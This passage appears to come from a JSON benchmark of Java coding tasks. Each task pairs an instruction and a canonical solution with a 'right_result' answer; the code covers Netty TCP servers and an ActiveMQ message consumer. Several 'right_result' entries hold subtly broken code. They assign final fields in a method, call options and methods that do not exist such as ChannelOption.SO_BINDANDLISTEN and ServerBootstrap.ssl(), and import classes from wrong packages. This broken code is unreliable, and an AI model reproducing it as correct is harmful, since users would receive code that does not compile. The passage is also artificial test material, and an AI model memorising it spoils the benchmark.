.childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n            .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive);\n\n        try {\n            LOG.info(\"Binding server. host={}, port={}\", host, port);\n            ChannelFuture f = b.bind(host, port);\n            LOG.info(\"Server has been bound. host={}, port={}\", host, port);\n            f.sync();\n        } catch (InterruptedException ex) {\n            LOG.error(\"An interruptedException was caught while initializing server\", ex);\n        }\n    }\n\n    public void close() {\n        LOG.info(\"Closing Netty acceptor...\");\n        if (m_workerGroup == null || m_bossGroup == null) {\n            throw new IllegalStateException(\"Invoked close on an Acceptor that wasn't initialized\");\n        }\n        Future<?> workerWaiter = m_workerGroup.shutdownGracefully();\n        Future<?> bossWaiter = m_bossGroup.shutdownGracefully();\n\n        try {\n            workerWaiter.await(10, TimeUnit.SECONDS);\n            bossWaiter.await(10, TimeUnit.SECONDS);\n        } catch (InterruptedException iex) {\n            LOG.warn(\"An InterruptedException was caught while waiting for event loops to terminate...\");\n        }\n\n        if (!m_workerGroup.isTerminated()) {\n            m_workerGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n\n        if (!m_bossGroup.isTerminated()) {\n            m_bossGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.ServerSocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class NettyAcceptor {\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass;\n    private int nettySoBacklog;\n    private boolean nettySoReuseaddr;\n    private boolean nettyTcpNodelay;\n    private boolean nettySoKeepalive;\n    private int nettyChannelTimeoutSeconds;\n\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) {\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n        nettySoBacklog = 100;\n        nettySoReuseaddr = true;\n        nettyTcpNodelay = true;\n        nettySoKeepalive = true;\n        nettyChannelTimeoutSeconds = 60;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n         .channel(channelClass)\n         .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n         .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n         .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n         .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive)\n         .childOption(ChannelOption.SO_TIMEOUT, nettyChannelTimeoutSeconds);\n\n        if (sslCtxCreator != null) {\n            b.ssl(sslCtxCreator.createSslContext());\n        }\n\n        b.childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                // Add MQTT handlers here\n                ch.pipeline().addLast(processor);\n            }\n        });\n\n        Channel channel = b.bind(1883).syncUninterruptibly();\n        channel.closeFuture().await();\n    }\n\n    public void initializePlainTCPTransport(NettyMQTTHandler handler, IConfig props) {\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n        nettySoBacklog = 100;\n        nettySoReuseaddr = true;\n        nettyTcpNodelay = true;\n        nettySoKeepalive = true;\n        nettyChannelTimeoutSeconds = 60;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n         .channel(channelClass)\n         .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n         .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n         .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n         .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive)\n         .childOption(ChannelOption.SO_TIMEOUT, nettyChannelTimeoutSeconds)\n         .childHandler(new ChannelInitializer<Channel>() {\n             @Override\n             protected void initChannel(Channel ch) throws Exception {\n                 ch.pipeline().addLast(handler);\n             }\n         });\n\n        Channel channel = b.bind(1883).syncUninterruptibly();\n        channel.closeFuture().await();\n    }\n\n    public void close() {\n        if (m_bossGroup != null) {\n            m_bossGroup.shutdownGracefully();\n        }\n        if (m_workerGroup != null) {\n            m_workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle file-related operations over a network connection.\n\nClass Description: FileServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes file-related requests using line-based text communication, and manages server resources efficiently.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' I/O operations\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- run: [run(int port)] -> [void] - Initializes and starts the Netty server on the specified port, configuring the server bootstrap with appropriate channel options and handlers\n  - Input: port [int] - The port number to bind the server to\n  - Output: None (void), but starts the server process\n- main: [main(String[] args)] -> [void] - Entry point that creates a FileServer instance and runs it on port 8082 (or a specified port if provided as command-line argument)\n  - Input: args [String[]] - Command line arguments (optional port number)\n  - Output: None (void), but initiates the server startup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\n\npublic class FileServer {\n\n    public void run(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                            new StringEncoder(CharsetUtil.UTF_8),\n                            new LineBasedFrameDecoder(1024),\n                            new StringDecoder(CharsetUtil.UTF_8),\n                            new FileServerHandler());\n                    }\n                });\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start at port : \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8082;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                e.printStackTrace();\n            }\n        }\n        new FileServer().run(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.simple.SimpleChannelInboundHandler;\n\npublic class FileServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public void run(int port) {\n        this.port = port;\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_REUSEADDR, true)\n                     .childOption(ChannelOption.SO_KEEPALIVE, true)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                             ch.pipeline().addLast(new StringDecoder());\n                             ch.pipeline().addLast(new StringEncoder());\n                             ch.pipeline().addLast(new FileServerHandler());\n                         }\n                     });\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class FileServerHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.writeAndFlush(msg + \": Ack\");\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8082;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Invalid port number: \" + args[0]);\n                System.exit(1);\n            }\n        }\n        FileServer server = new FileServer();\n        server.run(port);\n    }\n}"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Implement a Java class that consumes messages from an ActiveMQ broker, supporting both queue and topic message consumption patterns. The class should handle connection management and provide clean resource cleanup.\n\nClass Description: JmsConsumer is a Java class that connects to an ActiveMQ message broker to consume messages from either a queue or a topic. It manages the entire JMS connection lifecycle including connection establishment, session creation, message consumption, and resource cleanup.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection\n- PASSWORD: [String] - Default password for ActiveMQ connection\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection\n- connectionFactory: [ConnectionFactory] - Factory for creating JMS connections\n- connection: [Connection] - Active connection to the message broker\n- session: [Session] - JMS session for message processing\n- destination: [Destination] - Target queue or topic for message consumption\n- messageConsumer: [MessageConsumer] - Consumer instance for receiving messages\n\nMethods:\n- consumeQueueMessages() -> [void] - Consumes messages from a specified queue (\"SAMPLE_MQ_QUEUE\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- consumeTopicMessages() -> [void] - Consumes messages from a specified topic (\"SAMPLE_MQ_TOPIC\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- closeConnection() -> [void] - Closes the JMS connection and releases all resources. Should be called when message consumption is complete.",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"QUEUE\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void consumeTopicMessages() throws JMSException {\n        destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"TOPIC\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (JMSException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "right_result": "import javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"admin\";\n    private static final String BROKEURL = \"tcp://localhost:61616\";\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public JmsConsumer() {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void consumeQueueMessages() {\n        try {\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageConsumer = session.createConsumer(destination);\n            while (true) {\n                Message msg = messageConsumer.receive(10000);\n                if (msg == null) break;\n                System.out.println(\"Received: \" + msg);\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void consumeTopicMessages() {\n        try {\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageConsumer = session.createConsumer(destination);\n            while (true) {\n                Message msg = messageConsumer.receive(10000);\n                if (msg == null) break;\n                System.out.println(\"Received: \" + msg);\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (messageConsumer != null) messageConsumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework for handling client connections and message passing in a chat application.\n\nClass Description: The CIMServer class is a Spring component that initializes and manages a Netty-based TCP server. It handles client connections, maintains session information, and provides functionality to send messages to connected clients.\n\nAttributes:\n- boss: [EventLoopGroup] - Handles incoming connections and distributes them to worker threads\n- work: [EventLoopGroup] - Handles I/O operations for established connections\n- nettyPort: [int] - The port number on which the server listens for incoming connections\n\nMethods:\n- start(): [void]() -> [void] - Initializes and starts the Netty server (annotated with @PostConstruct)\n- destroy(): [void]() -> [void] - Shuts down the server gracefully (annotated with @PreDestroy)\n- sendMsg(): [void]([SendMsgReqVO sendMsgReqVO]) -> [void] - Sends a message to a specific client identified by user ID",
    "Canonical_solution": "import com.crossoverjie.cim.common.protocol.BaseCommand;\nimport com.crossoverjie.cim.common.protocol.Request;\nimport com.crossoverjie.cim.server.api.vo.req.SendMsgReqVO;\nimport com.crossoverjie.cim.server.init.CIMServerInitializer;\nimport com.crossoverjie.cim.server.util.SessionSocketHolder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport jakarta.annotation.PostConstruct;\nimport jakarta.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss = new NioEventLoopGroup();\n    private EventLoopGroup work = new NioEventLoopGroup();\n\n    @Value(\"${cim.server.port}\")\n    private int nettyPort;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap()\n                .group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(nettyPort))\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new CIMServerInitializer());\n\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            log.info(\"Start cim server success!!!\");\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully().syncUninterruptibly();\n        work.shutdownGracefully().syncUninterruptibly();\n        log.info(\"Close cim server success!!!\");\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        NioSocketChannel socketChannel = SessionSocketHolder.get(sendMsgReqVO.getUserId());\n\n        if (null == socketChannel) {\n            log.error(\"client {} offline!\", sendMsgReqVO.getUserId());\n            return;\n        }\n        Request protocol = Request.newBuilder()\n                .setRequestId(sendMsgReqVO.getUserId())\n                .setReqMsg(sendMsgReqVO.getMsg())\n                .putAllProperties(sendMsgReqVO.getProperties())\n                .setCmd(BaseCommand.MESSAGE)\n                .build();\n\n        ChannelFuture future = socketChannel.writeAndFlush(protocol);\n        future.addListener((ChannelFutureListener) channelFuture ->\n                log.info(\"server push msg:[{}]\", sendMsgReqVO.toString()));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.springframework.stereotype.Component;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport io.netty.buffer.Unpooled;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss;\n    private EventLoopGroup work;\n    private int nettyPort;\n    private Map<String, Channel> clients = new ConcurrentHashMap<>();\n\n    @Autowired\n    private Config config;\n\n    @PostConstruct\n    public void start() {\n        boss = new NioEventLoopGroup();\n        work = new NioEventLoopGroup();\n        nettyPort = config.getPort();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new ChatHandler());\n                    }\n                })\n                .childOption(io.netty.channel.ChannelOption.SO_KEEPALIVE, true)\n                .option(io.netty.channel.ChannelOption.SO_REUSEADDR, true)\n                .option(io.netty.channel.ChannelOption.SO_BINDANDLISTEN, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(nettyPort).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully();\n        work.shutdownGracefully();\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        Channel channel = clients.get(sendMsgReqVO.getUserId());\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(Unpooled.copiedBuffer(sendMsgReqVO.getMessage().getBytes()));\n        }\n    }\n\n    private class ChatHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            Channel channel = ctx.channel();\n            clients.put(\"user123\", channel);\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            Channel channel = ctx.channel();\n            clients.remove(\"user123\");\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String message = (String) msg;\n            for (Channel c : clients.values()) {\n                c.writeAndFlush(Unpooled.copiedBuffer(message.getBytes()));\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that listens for incoming connections, processes command-based requests, and returns appropriate responses. The server should support multiple commands and maintain a clean connection lifecycle.\n\nClass Description: Console is a singleton class that implements a TCP server with command processing capabilities. It maintains a registry of available commands and handles client connections using Netty's NIO framework.\n\nAttributes:\n- instance: Console - Singleton instance of the Console class\n- commands: Map<String, Class> - Registry mapping command strings to their respective Command classes\n\nMethods:\n- getInstance() -> Console - Returns the singleton instance of Console, initializing it with default commands if not already created\n- listenOnTCP(int port) -> void - Starts a TCP server on the specified port using Netty framework\n- Adapter: ChannelInboundHandlerAdapter - Inner class handling channel events and command processing\n  - channelRead(ChannelHandlerContext ctx, Object msg) -> void - Processes incoming messages as commands\n  - channelActive(ChannelHandlerContext ctx) -> void - Handles new connection initialization\n  - channelReadComplete(ChannelHandlerContext ctx) -> void - Handles post-read operations\n  - sendStringL(ChannelHandlerContext ctx, String text) -> void - Sends string with newline if missing\n  - sendString(ChannelHandlerContext ctx, String text) -> void - Sends string to client\n  - sendPrompt(ChannelHandlerContext ctx) -> void - Sends command prompt to client\n- Command: abstract static class - Base class for all command implementations\n  - Command(String command) - Constructor taking the command string\n  - execute() -> String - Abstract method to be implemented by concrete commands\n- HelpCommand: static class extends Command - Implements help command\n  - HelpCommand(String command) - Constructor\n  - execute() -> String - Returns help message\n- HelloCommand: static class extends Command - Implements hello command\n  - HelloCommand(String command) - Constructor\n  - execute() -> String - Returns random greeting message\n- DeviceCommand: static class extends Command - Implements device command\n  - DeviceCommand(String command) - Constructor\n  - execute() -> String - Returns device information in JSON format",
    "Canonical_solution": "import com.yeetor.androidcontrol.server.BaseServer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Console {\n\n    private static Console instance;\n    private Map<String, Class> commands;\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n            instance.commands = new HashMap<>();\n            instance.commands.put(\"help\", HelpCommand.class);\n            instance.commands.put(\"hello\", HelloCommand.class);\n            instance.commands.put(\"device\", DeviceCommand.class);\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new Adapter());\n                        }\n                    }).option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    class Adapter extends ChannelInboundHandlerAdapter {\n        \n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ByteBuf buf = (ByteBuf) msg;\n            byte[] res = new byte[buf.readableBytes()];\n            buf.readBytes(res);\n            buf.release();\n            \n            String str = new String(res).trim();\n            \n            Class cls = commands.get(str);\n            if (cls != null) {\n                Constructor constructor = cls.getDeclaredConstructor(String.class);\n                constructor.setAccessible(true);\n                Command command = (Command) constructor.newInstance(str);\n                sendStringL(ctx, command.execute());\n            } else {\n                sendString(ctx, \"command not found\\n\");\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendString(ctx, \"help \u5e2e\u52a9\u63d0\u793a\\r\\nhello \u4eba\u751f\u683c\u8a00\\r\\n\");\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n            sendPrompt(ctx);\n        }\n        \n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            sendString(ctx, text);\n        }\n        \n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ByteBuf encoded = ctx.alloc().buffer(4 * text.length());\n            encoded.writeBytes(text.getBytes());\n            ctx.write(encoded);\n            ctx.flush();\n        }\n        \n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"> \");\n        }\n    }\n\n    public abstract static class Command {\n        private String command;\n        public Command(String command) {\n            this.command = command;\n        }\n        public abstract String execute();\n    }\n\n    public static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return \"\u6682\u65f6\u6ca1\u6709\u5e2e\u52a9\uff01\";\n        }\n    }\n\n    public static class HelloCommand extends Command {\n        String[] strings = new String[] {\n                \"Talking is cheap, show me the code!\",\n                \"\u652f\u6301\u4f5c\u8005<http://yeetor.com>\"\n        };\n        HelloCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return strings[new java.util.Random().nextInt(strings.length)];\n        }\n    }\n\n    public static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return BaseServer.getDevicesJSON();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Random;\n\npublic class Console {\n    private static final Console instance = new Console();\n    private final Map<String, Class<? extends Command>> commands = new HashMap<>();\n\n    private Console() {\n        commands.put(\"help\", HelpCommand.class);\n        commands.put(\"hello\", HelloCommand.class);\n        commands.put(\"device\", DeviceCommand.class);\n    }\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new Handler());\n                         }\n                     })\n                     .option(io.netty.channel.ChannelOption.SO_BACKLOG, 100)\n                     .childOption(io.netty.channel.ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private class Handler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof String) {\n                String input = msg.toString().trim();\n                if (!input.isEmpty()) {\n                    String[] parts = input.split(\"\\\\s+\");\n                    String commandName = parts[0].toLowerCase();\n                    Class<? extends Command> commandClass = commands.get(commandName);\n                    if (commandClass != null) {\n                        try {\n                            Command command = commandClass.getDeclaredConstructor(String.class).newInstance(commandName);\n                            String response = command.execute();\n                            sendString(ctx, response);\n                            sendPrompt(ctx);\n                        } catch (Exception e) {\n                            sendString(ctx, \"Error: Invalid command\");\n                            sendPrompt(ctx);\n                        }\n                    } else {\n                        sendString(ctx, \"Error: Unknown command\");\n                        sendPrompt(ctx);\n                    }\n                }\n            }\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            ctx.write(text);\n        }\n\n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ctx.write(text);\n        }\n\n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"console> \");\n        }\n    }\n\n    abstract static class Command {\n        private final String command;\n\n        public Command(String command) {\n            this.command = command;\n        }\n\n        public abstract String execute();\n    }\n\n    static class HelpCommand extends Command {\n        public HelpCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            return \"Available commands:\\n\" +\n                   \"help - Show this help\\n\" +\n                   \"hello - Say hello\\n\" +\n                   \"device - Get device information\";\n        }\n    }\n\n    static class HelloCommand extends Command {\n     